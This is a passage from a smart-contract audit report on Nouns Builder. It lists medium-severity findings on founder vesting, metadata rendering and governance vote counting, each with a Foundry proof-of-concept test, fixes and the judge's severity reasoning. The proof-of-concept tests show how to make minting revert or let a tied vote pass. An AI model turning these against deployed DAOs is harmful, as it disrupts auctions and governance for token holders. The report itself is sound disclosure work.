ownership.\n\n### Proof of Concept\n\n1.  A proposal which calls `governor.transferOwnership()` is executed and transfers ownership to a new treasury address\n2.  When subsequent proposals are passed, `Governor.sol` will make an external call to `settings.treasury` which is not modified when ownership is passed\n3.  Therefore, `settings.treasury` is not able to modify any governance parameters such as `proposalThreshold`\n\nThe same issue applies to `Auction.sol`.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nModify `transferOwnership()` in the relevant contracts so that if ownership is transferred, then `settings.treasury` is changed accordingly.\n\n**[kulkarohan (Nouns Builder) acknowledged](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/468)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/468#issuecomment-1258725780):**\n > The Warden has shown how, due to the possibility of decoupling Treasury and Governor via Upgradeable.transferOwnership Auction.treasury may be set to the wrong address.\n> \n> Personally I think that the decoupling between Auction, Governor and Treasury should be removed as ultimately this system is meant to be \"immutable\" and a migration could be achieved via a full redeploy and then a proposal to transfer funds.\n> \n> However, the situation described by the Warden can happen and in those cases funds would be lost or sent to the wrong contract.\n> \n> Because a timelock needs to vote this, I'm inclined to reduce severity.\n> \n> However, because the contract functionality allows Ownership Transfer by default, but there's no custom code to update the settings, I think Medium Severity is appropriate as in certain cases the contract will not behave as intended.\n\n\n\n***\n\n## [[M-24] Token: Founder percentages not always respected](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/107)\n_Submitted by Lambda, also found by arcoun_\n\n[Token.sol#L110](https://github.com/code-423n4/2022-09-nouns-builder/blob/debe9b792cc70510eadf9b3728cde5b0f2ec9a1f/src/token/Token.sol#L110)<br>\n\nBecause of the \"greedy\" minting scheme for founders (tokens to founders are minted until `_isForFounder` returns `false`, i.e. until there is an unset `tokenRecipient[tokenId % 100]`), it can happen that the actual percentages of tokens that the founders receive deviate significantly from the desired percentages:\n\n### Proof Of Concept\n\nImagine we are in a situation where one founder has a 51% share and the other a 48% share. Because `schedule` is set to 1 for the first founder, `tokenRecipient[0] ... tokenRecipient[50]` will be set to his address. `tokenRecipient[51], tokenRecipient[53], ...` is set to the address of the second founder. Now let's say a mint happens just before the `vestExpiry` and when `tokenId % 100 == 0`. In such a situation, founder 1 will get 51 tokens (because of the consecutive entries in `tokenRecipients`) and founder 2 will get 1 token (because of the entry in `tokenRecipient[51]`, which is also consecutive. Let's say that the next mint happens after the vest expiration, which means that no founders get additional tokens.\n\nIn such a situation, founder 1 got 51 of the \"last 100\" token IDs, whereas founder 2 only got 1. Therefore, the overall percentage of tokens that those founders got will not be 51% and 40%. When the vest expiration was set to a time far in the future, it will be close to it, but when the vest timespan was only short, it can be very bad. In the extreme case where the expiration is set such that only 1 mint call causes mints for founders, founder 1 will have 51 tokens and founder 2 only 1, meaning the percentages are 51% / 1% instead of 51% / 48%!\n\n### Recommended Mitigation Steps\n\nConsider using another distribution scheme. Instead of the current \"greedy\" scheme (minting until a slot is free), it would make sense to mint the tokens for the founders every 100 tokens, i.e. everytime when `tokenId % 100 == 0`. Like that, it is ensured that the actual percentages are equal to the desired percentages.\n\n**[kulkarohan (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/107)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/107#issuecomment-1258737529):**\n > The warden has shown a specific combination of `founderPct` that will unfairly reward one founder at the detriment of another.\n> \n> Personally I'd recommend simming a set of schedules, perhaps via Fuzzing (which would have also enriched this submission), to find a solution that solves most use cases.\n> \n> Because the submission shows a way to lose tokens, in a way that is reliant on configuration, I agree with Medium Severity.\n\n\n\n***\n\n## [[M-25] MetadataRenderer contract raise error when minting](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/69)\n_Submitted by Migue_\n\n[MetadataRenderer.sol#L194](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L194)<br>\n\nIt is not possible to mint a ERC721 token if its properties has different length than its items.\n\n### Proof of Concept\n\nI run the following test to reproduce the error:\n\n```\n    deployMock();\n\n    vm.prank(address(governor));\n    string[] memory _names = new string[](1);\n    _names[0] = \"propertyName\"; //fill _names with some value\n    MetadataRendererTypesV1.ItemParam[] memory _items; //define empty array\n    \n    MetadataRendererTypesV1.IPFSGroup memory _ipfsGroup; \n    _ipfsGroup.baseUri = \"\";\n    _ipfsGroup.extension = \"\";\n    MetadataRenderer(token.metadataRenderer()).addProperties(_names, _items, _ipfsGroup); //call add property with _items array empty.\n\n    vm.stopPrank();\n    vm.prank(address(auction));\n\n    uint256 success = token.mint();//error happens inside here\n    assert(success != 0);\n\n    vm.stopPrank();\n    \n```\n\nLog from Foundry console:\n\n    ├─ [736] TOKEN::metadataRenderer() [staticcall]\n    │   ├─ [353] Token::metadataRenderer() [delegatecall]\n    │   │   └─ ← METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]\n    │   └─ ← METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]\n    ├─ [78618] METADATA_RENDERER::addProperties([\"propertyName\"], [], (\"\", \"\"))\n    │   ├─ [78172] MetadataRenderer::addProperties([\"propertyName\"], [], (\"\", \"\")) [delegatecall]\n    │   │   ├─ emit OwnerUpdated(prevOwner: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], newOwner: TREASURY: [0xf8cf955543f1ce957b81c1786be64d5fc96ad7b5])      \n    │   │   ├─ emit PropertyAdded(id: 0, name: \"propertyName\")\n    │   │   └─ ← ()\n    │   └─ ← ()\n    ├─ [0] VM::stopPrank()\n    │   └─ ← ()\n    ├─ [0] VM::prank(AUCTION: [0x9a1450e42d752b8731bc88f20dbaa9154642f1e6])\n    │   └─ ← ()\n    ├─ [121037] TOKEN::mint()\n    │   ├─ [120650] Token::mint() [delegatecall]\n    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], tokenId: 0)\n    │   │   ├─ emit DelegateVotesChanged(delegate: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], prevTotalVotes: 0, newTotalVotes: 1)\n    │   │   ├─ [25762] METADATA_RENDERER::onMinted(0)\n    │   │   │   ├─ [25372] MetadataRenderer::onMinted(0) [delegatecall]\n    │   │   │   │   └─ ← \"Division or modulo by 0\"\n    │   │   │   └─ ← \"Division or modulo by 0\"\n    │   │   └─ ← \"Division or modulo by 0\"\n    │   └─ ← \"Division or modulo by 0\"\n    └─ ← \"Division or modulo by 0\"\n\n### Tools Used\n\nFoundry<br>\nManual\n\n### Recommended Mitigation Steps\n\nIt could be mitigated checking length of both arrays in MetadataRenderer.addProperties() method.\n\nIt could be done after those lines: [MetadataRenderer.sol#L111-L115](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L111-L115).\n\nAlso I recommend to move those declaration and new validation at the beginning to save gas.\n\n**[iainnash (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/69)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/69#issuecomment-1258747070):**\n > In contrast to other reports, here the Warden has shown how to get a revert by having a mismatching length between properties and items.\n> \n> While a mitigating aspect for the finding is the fact that Governance will set these values, and most of the times these values will be set at deployment time.\n> The warden has shown how the code could revert in a way that we can consider unintended.\n> \n> The impact of the finding is that a new proposal would need to be raised to fix the mismatching length, until then no auctions could run.\n> \n> Because of the specificity of the report, the actual DOS outcome and the reliance on \"misinput\", I believe that the finding is of Medium Severity.\n\n\n\n***\n\n## [[M-26] Minting is not possible when a property has no items](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459)\n_Submitted by Jeiwan_\n\n[MetadataRenderer.sol#L194](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L194)<br>\n\nIf a property without items was added, minting becomes impossible. To enable minting again, an item must be added to the\nproperty, which is only possible through a new governance proposal.\n\n### Proof of Concept\n\nConsider the following test case:\n\n```solidity\nfunction testRevert_MintingWithPropertyWithoutItems() public {\n    // Deploying a token and a metadata renderer\n    address tknImpl = address(new Token(address(this)));\n    Token tkn = Token(address(new ERC1967Proxy(tknImpl, \"\")));\n\n    address rndrImpl = address(new MetadataRenderer(address(this)));\n    MetadataRenderer rndr = MetadataRenderer(address(new ERC1967Proxy(rndrImpl, \"\")));\n\n    bytes memory initString = abi.encode(\"Test\", \"Test\", \"Test\", \"Test\", \"Test\");\n    IManager.FounderParams[] memory founders = new IManager.FounderParams[](1);\n    founders[0] = IManager.FounderParams({ wallet: address(this), ownershipPct: 1, vestExpiry: 4 weeks });\n\n    tkn.initialize(founders, initString, address(rndr), address(this));\n    rndr.initialize(initString, address(tkn), address(this), address(this));\n\n    // Exploit starts here:\n\n    // Creating a property without items and adding it to the token.\n    string[] memory names = new string[](1);\n    MetadataRendererTypesV1.ItemParam[] memory items = new MetadataRendererTypesV1.ItemParam[](0);\n    MetadataRendererTypesV1.IPFSGroup memory ipfsGroup = MetadataRendererTypesV1.IPFSGroup({ baseUri: \"base\", extension: \"ext\" });\n\n    names[0] = \"uh-oh\";\n    // Founder forgot to add items.\n\n    rndr.addProperties(names, items, ipfsGroup);\n    assertEq(rndr.propertiesCount(), 1);\n\n    // Minting a token with a property without items and getting an error.\n    vm.expectRevert(stdError.divisionError);\n    tkn.mint();\n\n    // Adding an item to the property. At this point, this can only be done through a governance proposal.\n    names = new string[](0);\n    items = new MetadataRendererTypesV1.ItemParam[](1);\n    items[0] = MetadataRendererTypesV1.ItemParam({ propertyId: 0, name: \"fixed\", isNewProperty: false });\n    rndr.addProperties(names, items, ipfsGroup);\n\n    // Success.\n    tkn.mint();\n    assertEq(tkn.totalSupply(), 2);\n}\n```\n\n### Recommended Mitigation Steps\n\nShort term, in the [addProperties](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L91)\nfunction, ensure that each newly added property has at least one item.\n\nLong term, after adding properties and items in the [addProperties](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L91) function, ensure that next token can be minted and rendered without errors.\n\n**[kulkarohan (Nouns Builder) acknowledged](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459#issuecomment-1258757242):**\n > Consistently with [#523](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523), the Warden has shown how to cause `mint` to revert due to handling of properties and items, in this case by having a property without any.\n> \n> Because this finding shows a different way to cause a revert, I will file it separately.<br>\n> Because it shows the same type of revert as #523, I'll judge it in the same way as Medium Severity.\n\n\n\n***\n\n## [[M-27] Tokens without properties can be minted and cannot be rendered](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455)\n_Submitted by Jeiwan, also found by imare, ladboy233, and rvierdiiev_\n\nIt's possible to mint tokens when properties haven't yet been set in `MetadataRenderer`. Such tokens won't be possible\nto render due to [this check](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L222)\nin the `getAttributes` function of `MetaRenderer` contract. There's no way to fix such tokens after they were minted\nsince the number of properties of each token [is stored individually](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L216-L219), thus a patched `MetadataRenderer`\nand a proxy contract need to be deployed.\n\n### Proof of Concept\n\nConsider this test case:\n\n```solidity\nfunction testRevert_MintedWithoutProperties() public {\n    // Deploying a token and a metadata renderer\n    address tknImpl = address(new Token(address(this)));\n    Token tkn = Token(address(new ERC1967Proxy(tknImpl, \"\")));\n\n    address rndrImpl = address(new MetadataRenderer(address(this)));\n    MetadataRenderer rndr = MetadataRenderer(address(new ERC1967Proxy(rndrImpl, \"\")));\n\n    bytes memory initString = abi.encode(\"Test\", \"Test\", \"Test\", \"Test\", \"Test\");\n    IManager.FounderParams[] memory founders = new IManager.FounderParams[](1);\n    founders[0] = IManager.FounderParams({ wallet: address(this), ownershipPct: 1, vestExpiry: 4 weeks });\n\n    tkn.initialize(founders, initString, address(rndr), address(this));\n    rndr.initialize(initString, address(tkn), address(this), address(this));\n\n    // Exploit starts here:\n\n    // Properties haven't been added yet...\n    assertEq(rndr.propertiesCount(), 0);\n\n    // but minting is still possible.\n    tkn.mint();\n    assertEq(tkn.totalSupply(), 2); // 1 to the founder, 1 to the auction\n\n    // When trying to render a token without properties, there's a revert.\n    vm.expectRevert(abi.encodeWithSignature(\"TOKEN_NOT_MINTED(uint256)\", 0));\n    rndr.getAttributes(0);\n}\n```\n\nThe call to `getAttributes()` reverts because the token's attributes were not set since properties hadn't been\nadded to the metadata renderer.\n\n### Recommended Mitigation Steps\n\nIn the [onMinted()](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L171) function of `MetadataRenderer`, ensure that `properties.length` is greater than 0.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455#issuecomment-1253793820):**\n > I think a better solution is to have a default display or similar, but the finding is correct\n\n**[iainnash (Nouns Builder) acknowledged and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455#issuecomment-1258651736):**\n > Duplicate of [#459](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459)?\n\n**[iainnash (Nouns Builder) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455#issuecomment-1258654916):**\n > Slightly different from the other ticket mentioned. Not sure if this is a medium risk bug or more of an inconvenience since the mint succeeds and the DAO can vote to upgrade the impl.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455#issuecomment-1258766840):**\n > In contrast to [#459](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459), which shows a way to achieve a revert, this report shows how to mint a token without any properties.\n> \n> The question we are left to ask is whether a token without any property is a unique and \"rarer\" token, a mistake, a placeholder, or something else.\n> \n> We could argue that the finding is informational in nature as the \"lens\" of the codebase, the MetadataRenderer is the only contract that will revert.\n> \n> On the other hand, the lens will be reverting with a `TOKEN_NOT_MINTED` error.\n> \n> Meaning that we can argue that while the token exists, the token is in a state that is not well defined.\n> \n> Because upgrades are not in-scope we can only argue with the finding and the code in scope at this time.\n> \n> Because the contract will not revert in minting one or more people may end up purchasing a token that is \"in limbo\".\n> \n> While a bit of a stretch, given the irrefutable POC, showing that this can happen by \"forgetting to set properties\", I think Medium Severity to be appropriate.\n\n\n\n***\n\n## [[M-28] State function does not require majority of votes for supporting and passing a proposal](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/626)\n_Submitted by rbserver, also found by csanuragjain and Solimander_\n\nWhen determining the proposal's state, the following `state` function is called, which can execute `else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) { return ProposalState.Defeated; }`. If `proposal.forVotes` and `proposal.againstVotes` are the same, the proposal is not considered defeated when the quorum votes are reached by the for votes. However, many electoral systems require that the for votes to be more than the against votes in order to conclude that the proposal is passed because the majority of votes supports it. If the deployed DAO wants to require the majority of votes to support a proposal in order to pass it, the `state` function would incorrectly conclude that the proposal is not defeated when the for votes and against votes are the same at the end of voting. As a result, critical proposals, such as for updating implementations or withdrawing funds from the treasury, that should not be passed can be passed, or vice versa, so the impact can be huge.\n\n<https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L413-L456>\n\n```solidity\n    function state(bytes32 _proposalId) public view returns (ProposalState) {\n        // Get a copy of the proposal\n        Proposal memory proposal = proposals[_proposalId];\n\n        // Ensure the proposal exists\n        if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();\n\n        // If the proposal was executed:\n        if (proposal.executed) {\n            return ProposalState.Executed;\n\n            // Else if the proposal was canceled:\n        } else if (proposal.canceled) {\n            return ProposalState.Canceled;\n\n            // Else if the proposal was vetoed:\n        } else if (proposal.vetoed) {\n            return ProposalState.Vetoed;\n\n            // Else if voting has not started:\n        } else if (block.timestamp < proposal.voteStart) {\n            return ProposalState.Pending;\n\n            // Else if voting has not ended:\n        } else if (block.timestamp < proposal.voteEnd) {\n            return ProposalState.Active;\n\n            // Else if the proposal failed (outvoted OR didn't reach quorum):\n        } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n            return ProposalState.Defeated;\n\n            // Else if the proposal has not been queued:\n        } else if (settings.treasury.timestamp(_proposalId) == 0) {\n            return ProposalState.Succeeded;\n\n            // Else if the proposal can no longer be executed:\n        } else if (settings.treasury.isExpired(_proposalId)) {\n            return ProposalState.Expired;\n\n            // Else the proposal is queued\n        } else {\n            return ProposalState.Queued;\n        }\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in `test\\Gov.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function test_ProposalIsSucceededWhenNumberOfForAndAgainstVotesAreSame() public {\n        vm.prank(founder);\n        auction.unpause();\n\n        createVoters(7, 5 ether);\n\n        vm.prank(address(treasury));\n        governor.updateQuorumThresholdBps(2000);\n\n        bytes32 proposalId = createProposal();\n\n        vm.warp(block.timestamp + governor.votingDelay());\n\n        // number of for and against votes are both 2\n        castVotes(proposalId, 2, 2, 3);\n\n        vm.warp(block.timestamp + governor.votingPeriod());\n\n        // the proposal is considered succeeded when number of for and against votes are the same after voting ends\n        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Succeeded));\n\n        // the proposal can be queued afterwards\n        governor.queue(proposalId);\n        assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Queued));\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nIf there is no need to pass a proposal when `proposal.forVotes` and `proposal.againstVotes` are the same at the end of voting, then [Governor.sol#L441-L442](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441-L442) can be changed to the following code.\n\n```solidity\n        } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n            return ProposalState.Defeated;\n```\n\nOtherwise, a governance configuration can be added to indicate whether the majority of votes is needed or not for supporting and passing a proposal. The `state` function then could return `ProposalState.Defeated` when `proposal.forVotes <= proposal.againstVotes` if so and when `proposal.forVotes < proposal.againstVotes` if not.\n\n**[tbtstl (Nouns Builder) confirmed](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/626)**\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/626#issuecomment-1258853233):**\n > The warden has shown how, due to a flaw in order of operations and usage of the strict less than sign operator, a proposal with exactly 50% support can still pass as successful.\n> \n> This can be dramatic as the definition of Majority is \"The greater number\", which we would quantity as 50% + 1.\n> \n> The finding is valid in that a situation can arise in which a proposal, with 50% detractors, would still pass, however, the specific operator `<` means that this can happen exclusively if the different is by one, meaning that of all possible \"vote distributions\", we'd need a perfect 50/50.\n> \n> Because of that, while I believe the finding should be mitigated, I think the finding is of Medium Severity as it will happen only in a specific situation.\n\n\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 124 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/104) by **Lambda** received the top score from the judge.\n\n*The following wardens also submitted reports: [Deivitto](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/684), [0xSmartContract](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/381), [Jeiwan](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/472), [simon135](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/399), [R2](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/139), [rbserver](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/670), [0xNazgul](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/278), [sorrynotsorry](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/496), [CodingNameKiki](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/12), [brgltd](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/713), [ChristianKuri](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/80), [hansfriese](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/543), [0x4non](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/332), [c3phas](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/658), [CertoraInc](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/320), [cryptphi](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/663), [zkhorse](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/418), [0x1337](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/247), [scaraven](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/593), [leosathya](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/527), [\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/464), [djxploit](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/556), [indijanc](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/266), [RaymondFam](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/206), [B2](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/554), [Chom](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/338), [dipp](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/572), [zzzitron](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/349), [imare](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/315), [izhuer](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/657), [0x1f8b](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/297), [rvierdiiev](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/221), [MiloTruck](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/362), [robee](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/60), [Rolezn](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/204), [csanuragjain](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/192), [datapunk](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/686), [Tomo](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/35), [Aymen0909](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/544), [cccz](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/131), [Respx](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/384), [asutorufos](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/552), [erictee](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/6), [ne0n](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/42), [tonisives](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/568), [Waze](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/483), [8olidity](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/18), [pcarranzav](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/149), [pedr02b2](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/322), [pfapostol](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/145), [ladboy233](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/81), [sikorico](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/173), [Bnke0x0](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/47), [ch0bu](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/261), [jonatascm](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/263), [m9800](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/720), [oyc\\_109](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/57), [PwnPatrol](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/341), [0x85102](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/26), [ReyAdmirado](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/126), [sahar](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/547), [volky](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/357), [ak1](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/638), [d3e4](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/716), [EthLedger](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/45), [fatherOfBlocks](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/157), [lukris02](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/528), [PPrieditis](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/326), [Samatak](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/258), [azephiar](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/424), [bulej93](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/250), [Ch\\_301](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/577), [cryptostellar5](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/505), [eierina](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/712), [ElKu](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/410), [Jujic](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/129), [lucacez](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/717), [0xA5DF](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/242), [sach1r0](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/516), [Tointer](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/117), [bharg4v](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/722), [bin2chen](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/409), [Captainkay](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/231), [cryptonue](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/645), [Franfran](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/386), [gogo](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/50), [JansenC](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/283), [neumo](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/359), [peritoflores](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/682), [hyh](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/510), [davidbrai](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/178), [0xc0ffEE](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/346), [slowmoses](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/481), [yixxas](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/155), [GimelSec](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/584), [pauliax](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/704), [tnevler](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/551), [bobirichman](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/176), [cloudjunky](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/256), [Diana](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/506), [Funen](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/592), [0xbepresent](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/245), [ret2basic](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/520), [V\\_B](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/698), [a12jmx](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/679), [delfin454000](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/573), [DimitarDimitrov](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/166), [MasterCookie](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/28), [MEP](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/270), [Noah3o6](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/40), [p\\_crypt0](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/635), [PaludoX0](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/438), [pashov](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/639), [\\_Adam](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/428), [ballx](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/15), [CRYP70](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/220), [dharma09](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/55), [dic0de](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/444), [Lead\\_Belly](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/115), [martin](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/200), [minhtrng](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/98), [Picodes](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/197), and [Randyyy](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/687).*\n\n## [01]\nIn `Token`, when a founder has `wallet` set to `address(0)`, he will not receive any tokens (which is good), but he is still included in all of the calculations such as `numFounders` or `totalOwnership`, meaning that they will be wrong in such situations.\n\n## [02]\nIn `Token`, `totalFounderOwnership()` does not incorparate the vesting period. It is just the total percent ownership that the founders received at one point in time, but this metric is pretty useless without incorporating the timespan (as 100% for 1 week is very different to 10% for 10 years).\n\n## [03]\nIn `MetadataRenderer._getItemImage`, a dot is missing between the item name and extension 